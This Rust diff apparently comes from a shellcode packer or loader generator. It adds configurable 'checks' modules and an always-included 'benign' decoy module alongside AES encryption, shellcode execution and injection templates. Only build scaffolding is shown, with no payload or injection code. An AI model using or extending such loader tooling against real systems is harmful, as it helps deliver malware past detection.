@@ -44,6 +44,21 @@ pub const TEMPLATE_MODULES: &[TemplateModule] = &[
         dest_file: "./loader/src/utilities/utils.rs",
     },
     TemplateModule {
+        name: "checks_mod",
+        source_file: "./template/checks/mod.rs",
+        dest_file: "./loader/src/checks/mod.rs",
+    },
+    TemplateModule {
+        name: "checks_checks",
+        source_file: "./template/checks/checks.rs",
+        dest_file: "./loader/src/checks/checks.rs",
+    },
+    TemplateModule {
+        name: "benign",
+        source_file: "./template/benign.rs",
+        dest_file: "./loader/src/benign.rs",
+    },
+    TemplateModule {
         name: "aes",
         source_file: "./template/aes/aes.rs",
         dest_file: "./loader/src/aes.rs",
@@ -84,10 +99,6 @@ pub const ADDITIONAL_FILES: &[AdditionalFile] = &[
 pub fn build_compile_command(config: &PackerConfig, payload_type: &PayloadType) -> String {
     let mut compile_command = "build --release ".to_string();
     
-    if config.random_calculation {
-        compile_command.push_str("--features calculation ");
-    }
-    
     // Only include shellcode execution features for actual shellcode payloads
     if matches!(payload_type, PayloadType::Shellcode) {
         compile_command.push_str(&format!("--features {} ", config.execution_shellcode.feature_name()));
@@ -97,6 +108,11 @@ pub fn build_compile_command(config: &PackerConfig, payload_type: &PayloadType) 
     // Add utility features
     for utility in &config.utils {
         compile_command.push_str(&format!("--features {} ", utility.feature_name()));
+    }
+    
+    // Add check features
+    for check in &config.checks {
+        compile_command.push_str(&format!("--features {} ", check.feature_name()));
     }
     
     if let Some(encryption) = config.encrypt {
@@ -122,6 +138,7 @@ pub fn setup_loader_directory() -> Result<(), std::io::Error> {
     std::fs::create_dir_all("loader/src")?;
     std::fs::create_dir_all("loader/src/execution")?;
     std::fs::create_dir_all("loader/src/utilities")?;
+    std::fs::create_dir_all("loader/src/checks")?;
     
     // Copy Cargo.toml from template to loader directory
     let template_cargo = "template/Cargo.toml";
@@ -149,8 +166,10 @@ fn copy_template_module(module: &TemplateModule) -> Result<(), std::io::Error> {
 fn should_include_module(module_name: &str, config: &PackerConfig) -> bool {
     match module_name {
         "execution_mod" | "execution_execution" | "execution_injection" => true,
+        "benign" => true,  // Always include benign code
         "aes" => config.encrypt.is_some(),
         "utilities_mod" | "utilities_utils" => !config.utils.is_empty(),
+        "checks_mod" | "checks_checks" => !config.checks.is_empty(),
         _ => false,
     }
 }
@@ -181,13 +200,14 @@ pub fn display_feature_summary(config: &PackerConfig) {
     
     let mut features = Vec::new();
     
-    if config.random_calculation {
-        features.push("Random Calculation");
-    }
-    
-    // Add utility features first (they run before execution)
+    // Add utility features first
     for utility in &config.utils {
         features.push(utility.display_name());
+    }
+    
+    // Add check features
+    for check in &config.checks {
+        features.push(check.display_name());
     }
     
     features.push(config.execution_shellcode.display_name());
